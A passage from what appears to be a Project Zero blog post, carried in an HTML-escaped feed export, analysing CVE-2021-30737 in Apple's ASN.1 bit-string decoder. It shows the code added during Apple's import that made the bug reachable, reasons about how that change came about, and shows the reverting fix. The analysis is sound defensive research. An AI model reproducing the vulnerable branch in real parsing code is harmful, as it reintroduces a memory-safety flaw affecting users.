&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;-&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;((&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;pending &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;||&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;))&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest &lt;/span&gt;&lt;span class=\"c1\"&gt;!=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c20\"&gt;SECItem&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;item &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c20\"&gt;SECItem&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Data&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Length&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c23\"&gt;/* skip over (unused) remainder byte */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;else&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;In the context of all the other changes in this initial import this change looks much less suspicious than I first thought. My guess is that the Apple developers thought that Mozilla had missed handling the case of a bitstring with only the unused-bits bytes and attempted to add support for it. It looks like the &lt;/span&gt;&lt;span class=\"c7\"&gt;state-&amp;gt;pending == 0&lt;/span&gt;&lt;span&gt;&amp;nbsp;conditional must have been Mozilla&amp;#39;s check for handling a 0-length bitstring so therefore it was quite reasonable to think that the way it was handling that case by &lt;/span&gt;&lt;span class=\"c7\"&gt;NULL&lt;/span&gt;&lt;span&gt;ing out &lt;/span&gt;&lt;span class=\"c7\"&gt;item-&amp;gt;data&lt;/span&gt;&lt;span&gt;&amp;nbsp;was the right thing to do, so it must also be correct to add the &lt;/span&gt;&lt;span class=\"c7\"&gt;contents_length == 1&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;case here.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;In reality the &lt;/span&gt;&lt;span class=\"c7\"&gt;contents_length == 1&lt;/span&gt;&lt;span&gt;&amp;nbsp;case was handled perfectly correctly anyway in &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_more_bit_string&lt;/span&gt;&lt;span&gt;, but it wasn&amp;#39;t unreasonable to assume that it had been overlooked based on what looked like a special case handling for the missing unused-bits byte in &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span class=\"c9\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;The fix for the bug was simply to revert the change made during the initial import 18 years ago, making the dangerous but unreachable code unreachable once more:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.cc85cec956c682ae2159b3e2792de03dfdc37f3c\"&gt;&lt;/a&gt;&lt;a id=\"t.22\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;((&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;pending &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;||&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;==&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;1&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;)&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest &lt;/span&gt;&lt;span class=\"c1\"&gt;!=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;item &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Data&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c20\"&gt;Length&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c12\"&gt;if&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;==&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;1&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;)&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23 c12\"&gt;/* skip over (unused) remainder byte */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c12\"&gt;return&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;1&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c12\"&gt;else&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 class=\"c32 c8 c15\" id=\"h.kac2os93mix4\"&gt;&lt;span class=\"c31 c28\"&gt;Conclusions&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;Forking complicated code is complicated. In this case it took almost two decades to in the end just revert a change made during import. Even verifying whether this revert is correct is really hard.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;The Mozilla and Apple codebases have continued to diverge since 2003. As I discovered slightly too late to be useful, the Mozilla code now has more comments trying to explain the decoder&amp;#39;s &amp;quot;novel&amp;quot; memory safety approach.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;Rewriting this code to be more understandable (and maybe even memory safe) is also distinctly non-trivial. The code doesn&amp;#39;t just implement ASN.1 decoding; it also has to support safely decoding incorrectly encoded data, as described by this verbatim comment for example:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; * Okay, this is a hack. &amp;nbsp;It *should* be an error whether&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; * pending is too big or too small, but it turns out that&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; * we had a bug in our *old* DER encoder that ended up&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; * counting an explicit header twice in the case where&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; * the underlying type was an ANY. &amp;nbsp;So, because we cannot&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; * prevent receiving these (our own certificate server can&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; * send them to us), we need to be lenient and accept them.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; * To do so, we need to pretend as if we read all of the&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; * bytes that the header said we would find, even though&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; * we actually came up short.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;&amp;nbsp; */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Verifying that a rewritten, simpler decoder also handles every hard-coded edge case correctly probably leads to it not being so simple after all.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/1033743652169779882/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/1033743652169779882"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/1033743652169779882"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html","@title":"CVE-2021-30737, @xerub's 2021 iOS ASN.1 Vulnerability"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3Zm78R4JD6H57okd_d1wpa26R9mX0Q746I5hMzwV8EMxosHbDjO5l5tH2hEpkq0m3S7AMmHOU9_6J7veCrxIxq66ilLSKJCLgHBGalgzSo0MrCulaERSbqUhXkHwqNbZdeVg4JWisV2ZuDb_j_AxLxvzX3t1EEtp396DCTt6fYeihuTRsevnnGUXD/s72-c/image2%20%281%29%281%29.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-1353264177358891846","published":"2022-03-31T09:00:00.003-07:00","updated":"2022-08-24T12:04:44.188-07:00","title":{"@type":"text","#text":"FORCEDENTRY: Sandbox Escape"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;ol{margin:0;padding:0}table td,table 